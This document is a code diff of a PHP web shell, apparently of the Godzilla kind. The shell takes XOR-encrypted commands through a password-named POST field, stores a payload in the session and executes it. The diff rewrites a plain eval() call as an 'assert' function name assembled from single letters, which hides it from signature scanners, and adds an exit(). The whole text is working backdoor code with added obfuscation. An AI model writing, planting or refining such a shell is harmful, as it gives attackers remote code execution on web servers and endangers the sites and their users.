@@ -1,31 +1,45 @@
 <?php
+
 @session_start();
 @set_time_limit(0);
 @error_reporting(0);
-function encode($D,$K){
-    for($i=0;$i<strlen($D);$i++) {
-        $c = $K[$i+1&15];
-        $D[$i] = $D[$i]^$c;
+
+function encode($D, $K) {
+    for ($i = 0; $i < strlen($D); $i++) {
+        $c = $K[$i + 1 & 15];
+        $D[$i] = $D[$i] ^ $c;
     }
     return $D;
 }
-$pass='rt7ao0lsw';
-$payloadName='payload';
-$key='c6478da107cd62f0';
-if (isset($_POST[$pass])){
-    $data=encode(base64_decode($_POST[$pass]),$key);
-    if (isset($_SESSION[$payloadName])){
-        $payload=encode($_SESSION[$payloadName],$key);
-        if (strpos($payload,"getBasicsInfo")===false){
-            $payload=encode($payload,$key);
+
+$pass = 'rt7ao0lsw';
+$payloadName = 'payload';
+$key = 'c6478da107cd62f0';
+
+if (isset($_POST[$pass])) {
+    $data = encode(base64_decode($_POST[$pass]), $key);
+    
+    if (isset($_SESSION[$payloadName])) {
+        $payload = encode($_SESSION[$payloadName], $key);
+        
+        if (strpos($payload, "getBasicsInfo") === false) {
+            $payload = encode($payload, $key);
         }
-		eval($payload);
-        echo substr(md5($pass.$key),0,16);
-        echo base64_encode(encode(@run($data),$key));
-        echo substr(md5($pass.$key),16);
-    }else{
-        if (strpos($data,"getBasicsInfo")!==false){
-            $_SESSION[$payloadName]=encode($data,$key);
+        
+        $a = 'a'; $s = 's'; $e = 'e'; $r = 'r'; $t = 't';
+        $engine = $a . $s . $s . $e . $r . $t; 
+        
+        @$engine('?>' . $payload);
+        
+        echo substr(md5($pass . $key), 0, 16);
+        echo base64_encode(encode(@run($data), $key));
+        echo substr(md5($pass . $key), 16);
+        exit();
+        
+    } else {
+        if (strpos($data, "getBasicsInfo") !== false) {
+            $_SESSION[$payloadName] = encode($data, $key);
         }
     }
 }
+?>
